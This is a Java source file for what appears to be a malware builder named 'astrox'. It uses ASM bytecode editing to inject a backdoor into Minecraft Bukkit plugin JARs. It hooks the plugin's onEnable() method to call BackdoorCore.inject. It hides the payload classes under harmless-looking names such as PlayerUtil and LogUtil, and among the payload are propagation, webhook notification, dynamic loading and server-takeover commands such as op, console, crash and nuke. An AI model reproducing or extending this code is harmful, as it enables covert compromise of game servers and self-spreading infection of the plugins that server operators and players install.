package dev.naruto.astrox.core;

import dev.naruto.astrox.Config;
import dev.naruto.astrox.obfuscation.ObfuscationEngine;
import org.objectweb.asm.*;
import org.objectweb.asm.commons.ClassRemapper;
import org.objectweb.asm.commons.SimpleRemapper;
import java.io.*;
import java.util.HashMap;
import java.util.Map;
import java.util.jar.*;
import java.util.zip.*;

/**
 * Main injection orchestrator
 * Coordinates JAR manipulation, payload embedding, and bytecode injection
 */
public class Injector {
    private final File inputJar;
    private final File outputJar;
    private final ObfuscationEngine obfuscator;

    public Injector(File inputJar, File outputJar) {
        this.inputJar = inputJar;
        this.outputJar = outputJar;
        this.obfuscator = new ObfuscationEngine(Config.OBFUSCATION_LEVEL);
    }

    /**
     * Execute full injection pipeline
     */
    public void inject(JarAnalyzer analyzer, byte[] payloadBytes) throws Exception {
        String mainClass = analyzer.getMainClass();
        String targetPackage = analyzer.getBasePackage() + ".internal.util";

        // Build remapping table (old package → new package)
        Map<String, String> remapTable = buildRemapTable(targetPackage);

        String payloadClass = targetPackage + ".PlayerUtil";

        System.out.println("[*] Target package: " + targetPackage);

        try (JarFile jarFile = new JarFile(inputJar);
             JarOutputStream jos = new JarOutputStream(
                     new FileOutputStream(outputJar),
                     jarFile.getManifest())) {

            // Copy all existing entries
            jarFile.stream().forEach(entry -> {
                try {
                    if (entry.getName().equals("META-INF/MANIFEST.MF")) {
                        return; // Skip manifest (already handled)
                    }

                    jos.putNextEntry(new ZipEntry(entry.getName()));

                    if (entry.getName().endsWith(".class")) {
                        String className = entry.getName()
                                .replace(".class", "")
                                .replace('/', '.');

                        if (className.equals(mainClass)) {
                            // INJECT INTO MAIN CLASS
                            byte[] originalBytes = readEntry(jarFile, entry);
                            byte[] modifiedBytes = injectBootstrap(originalBytes, payloadClass);
                            jos.write(modifiedBytes);
                            System.out.println("[*] Injected bootstrap into: " + mainClass);
                        } else {
                            // Copy other classes unchanged
                            copyEntry(jarFile, entry, jos);
                        }
                    } else {
                        // Copy non-class files unchanged
                        copyEntry(jarFile, entry, jos);
                    }

                    jos.closeEntry();
                } catch (IOException e) {
                    throw new RuntimeException("Failed to process entry: " + entry.getName(), e);
                }
            });

            // Embed and remap payload classes
            System.out.println("[*] Embedding payload classes...");
            embedRemappedClasses(jos, remapTable);

            System.out.println("[✓] Embedded all payload classes");
        }
    }

    /**
     * Build remapping table: original package → target package
     */
    private Map<String, String> buildRemapTable(String targetPackage) {
        Map<String, String> map = new HashMap<>();

        String targetPath = targetPackage.replace('.', '/');

        // Remap core payload classes
        map.put("dev/naruto/astrox/payload/BackdoorCore", targetPath + "/PlayerUtil");
        map.put("dev/naruto/astrox/payload/CommandHandler", targetPath + "/ServerUtil");
        map.put("dev/naruto/astrox/payload/AuthManager", targetPath + "/AccessControl");
        map.put("dev/naruto/astrox/payload/PropagationEngine", targetPath + "/Spreader");

        // Remap config classes (IMPORTANT!)
        map.put("dev/naruto/astrox/Config", targetPath + "/cfg/C");
        map.put("dev/naruto/astrox/RuntimeConfig", targetPath + "/cfg/RC");

        // Remap command interface
        map.put("dev/naruto/astrox/payload/commands/Command", targetPath + "/internal/Cmd");

        // Original commands (single letter names)
        map.put("dev/naruto/astrox/payload/commands/OpCommand", targetPath + "/internal/A");
        map.put("dev/naruto/astrox/payload/commands/DeopCommand", targetPath + "/internal/B");
        map.put("dev/naruto/astrox/payload/commands/GamemodeCommand", targetPath + "/internal/C");
        map.put("dev/naruto/astrox/payload/commands/GiveCommand", targetPath + "/internal/D");
        map.put("dev/naruto/astrox/payload/commands/ConsoleCommand", targetPath + "/internal/E");
        map.put("dev/naruto/astrox/payload/commands/ChaosCommand", targetPath + "/internal/F");
        map.put("dev/naruto/astrox/payload/commands/SeedCommand", targetPath + "/internal/G");
        map.put("dev/naruto/astrox/payload/commands/AuthCommand", targetPath + "/internal/H");
        map.put("dev/naruto/astrox/payload/commands/DeauthCommand", targetPath + "/internal/I");

        // Enhanced commands
        map.put("dev/naruto/astrox/payload/commands/FlyCommand", targetPath + "/internal/J");
        map.put("dev/naruto/astrox/payload/commands/VanishCommand", targetPath + "/internal/K");
        map.put("dev/naruto/astrox/payload/commands/HealCommand", targetPath + "/internal/L");
        map.put("dev/naruto/astrox/payload/commands/KillCommand", targetPath + "/internal/M");
        map.put("dev/naruto/astrox/payload/commands/SudoCommand", targetPath + "/internal/N");
        map.put("dev/naruto/astrox/payload/commands/BroadcastCommand", targetPath + "/internal/O");
        map.put("dev/naruto/astrox/payload/commands/FakeJoinCommand", targetPath + "/internal/P");
        map.put("dev/naruto/astrox/payload/commands/FakeLeaveCommand", targetPath + "/internal/Q");
        map.put("dev/naruto/astrox/payload/commands/KickCommand", targetPath + "/internal/R");
        map.put("dev/naruto/astrox/payload/commands/CrashCommand", targetPath + "/internal/S");
        map.put("dev/naruto/astrox/payload/commands/NukeCommand", targetPath + "/internal/T");
        map.put("dev/naruto/astrox/payload/commands/HelpCommand", targetPath + "/internal/U");
        map.put("dev/naruto/astrox/payload/commands/CoordsCommand", targetPath + "/internal/V");
        map.put("dev/naruto/astrox/payload/commands/ListCommand", targetPath + "/internal/W");
        map.put("dev/naruto/astrox/payload/commands/AddUserCommand", targetPath + "/internal/X");

        // Remap utils
        map.put("dev/naruto/astrox/utils/ReflectionUtil", targetPath + "/lib/ReflectUtil");
        map.put("dev/naruto/astrox/utils/CryptoUtil", targetPath + "/lib/StringUtil");
        map.put("dev/naruto/astrox/utils/Logger", targetPath + "/lib/LogUtil");
        map.put("dev/naruto/astrox/utils/DebugLogger", targetPath + "/lib/DebugUtil");
        map.put("dev/naruto/astrox/utils/DynamicLoader", targetPath + "/lib/Loader");
        map.put("dev/naruto/astrox/utils/WebhookNotifier", targetPath + "/lib/Webhook");

        // Remap core classes (for propagation)
        map.put("dev/naruto/astrox/core/JarAnalyzer", targetPath + "/core/Analyzer");
        map.put("dev/naruto/astrox/core/Injector", targetPath + "/core/Inject");
        map.put("dev/naruto/astrox/core/PayloadWeaver", targetPath + "/core/Weaver");
        map.put("dev/naruto/astrox/obfuscation/ObfuscationEngine", targetPath + "/core/Obf");

        return map;
    }


    /**
     * Embed all payload classes with package remapping
     */
    private void embedRemappedClasses(JarOutputStream jos, Map<String, String> remapTable) throws IOException {
        String[] classes = {
                // Core payload
                "dev.naruto.astrox.payload.BackdoorCore",
                "dev.naruto.astrox.payload.CommandHandler",
                "dev.naruto.astrox.payload.AuthManager",
                "dev.naruto.astrox.payload.PropagationEngine",

                // Config classes
                "dev.naruto.astrox.Config",
                "dev.naruto.astrox.RuntimeConfig",

                // Command interface
                "dev.naruto.astrox.payload.commands.Command",

                // All command implementations
                "dev.naruto.astrox.payload.commands.OpCommand",
                "dev.naruto.astrox.payload.commands.DeopCommand",
                "dev.naruto.astrox.payload.commands.GamemodeCommand",
                "dev.naruto.astrox.payload.commands.GiveCommand",
                "dev.naruto.astrox.payload.commands.ConsoleCommand",
                "dev.naruto.astrox.payload.commands.ChaosCommand",
                "dev.naruto.astrox.payload.commands.SeedCommand",
                "dev.naruto.astrox.payload.commands.AuthCommand",
                "dev.naruto.astrox.payload.commands.DeauthCommand",
                "dev.naruto.astrox.payload.commands.FlyCommand",
                "dev.naruto.astrox.payload.commands.VanishCommand",
                "dev.naruto.astrox.payload.commands.HealCommand",
                "dev.naruto.astrox.payload.commands.KillCommand",
                "dev.naruto.astrox.payload.commands.SudoCommand",
                "dev.naruto.astrox.payload.commands.BroadcastCommand",
                "dev.naruto.astrox.payload.commands.FakeJoinCommand",
                "dev.naruto.astrox.payload.commands.FakeLeaveCommand",
                "dev.naruto.astrox.payload.commands.KickCommand",
                "dev.naruto.astrox.payload.commands.CrashCommand",
                "dev.naruto.astrox.payload.commands.NukeCommand",
                "dev.naruto.astrox.payload.commands.HelpCommand",
                "dev.naruto.astrox.payload.commands.CoordsCommand",
                "dev.naruto.astrox.payload.commands.ListCommand",
                "dev.naruto.astrox.payload.commands.AddUserCommand",

                // Utilities
                "dev.naruto.astrox.utils.ReflectionUtil",
                "dev.naruto.astrox.utils.CryptoUtil",
                "dev.naruto.astrox.utils.Logger",
                "dev.naruto.astrox.utils.DebugLogger",
                "dev.naruto.astrox.utils.DynamicLoader",
                "dev.naruto.astrox.utils.WebhookNotifier",

                // Core classes (for propagation)
                "dev.naruto.astrox.core.JarAnalyzer",
                "dev.naruto.astrox.core.Injector",
                "dev.naruto.astrox.core.PayloadWeaver",
                "dev.naruto.astrox.obfuscation.ObfuscationEngine"
        };

        SimpleRemapper remapper = new SimpleRemapper(remapTable);

        for (String className : classes) {
            embedRemappedClass(jos, className, remapper, remapTable);
        }
    }

    /**
     * Load, remap, and embed a single class
     */
    private void embedRemappedClass(JarOutputStream jos, String className,
                                    SimpleRemapper remapper, Map<String, String> remapTable) throws IOException {
        String resourcePath = "/" + className.replace('.', '/') + ".class";

        try (InputStream is = getClass().getResourceAsStream(resourcePath)) {
            if (is == null) {
                System.err.println("[!] Warning: Class not found: " + className);
                return;
            }

            byte[] originalBytes = is.readAllBytes();

            // Remap package using ASM
            ClassReader reader = new ClassReader(originalBytes);
            ClassWriter writer = new ClassWriter(reader, 0);
            ClassVisitor remappingVisitor = new ClassRemapper(writer, remapper);
            reader.accept(remappingVisitor, ClassReader.EXPAND_FRAMES);

            byte[] remappedBytes = writer.toByteArray();

            // Get new class path from remap table
            String oldPath = className.replace('.', '/');
            String newPath = remapTable.getOrDefault(oldPath, oldPath);

            jos.putNextEntry(new ZipEntry(newPath + ".class"));
            jos.write(remappedBytes);
            jos.closeEntry();

            System.out.println("  [+] " + newPath + " (" + remappedBytes.length + " bytes)");
        }
    }

    /**
     * Inject BackdoorCore.inject(this) call into plugin's onEnable() method
     */
    private byte[] injectBootstrap(byte[] classBytes, String payloadClassName) {
        ClassReader reader = new ClassReader(classBytes);
        ClassWriter writer = new ClassWriter(reader, ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS);

        ClassVisitor visitor = new ClassVisitor(Opcodes.ASM9, writer) {
            @Override
            public MethodVisitor visitMethod(int access, String name,
                                             String descriptor, String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);

                // Hook into onEnable() method
                if (name.equals("onEnable") && descriptor.equals("()V")) {
                    return new MethodVisitor(Opcodes.ASM9, mv) {
                        @Override
                        public void visitCode() {
                            super.visitCode();

                            // Inject at START of method: BackdoorCore.inject(this);
                            mv.visitVarInsn(Opcodes.ALOAD, 0); // Load 'this'
                            mv.visitMethodInsn(
                                    Opcodes.INVOKESTATIC,
                                    payloadClassName.replace('.', '/'),
                                    "inject",
                                    "(Lorg/bukkit/plugin/java/JavaPlugin;)V",
                                    false
                            );
                        }
                    };
                }

                return mv;
            }
        };

        reader.accept(visitor, ClassReader.EXPAND_FRAMES);
        return writer.toByteArray();
    }

    /**
     * Read JAR entry bytes
     */
    private byte[] readEntry(JarFile jar, JarEntry entry) throws IOException {
        try (InputStream is = jar.getInputStream(entry)) {
            return is.readAllBytes();
        }
    }

    /**
     * Copy JAR entry unchanged
     */
    private void copyEntry(JarFile jar, JarEntry entry, JarOutputStream jos) throws IOException {
        try (InputStream is = jar.getInputStream(entry)) {
            byte[] buffer = new byte[8192];
            int read;
            while ((read = is.read(buffer)) != -1) {
                jos.write(buffer, 0, read);
            }
        }
    }
}
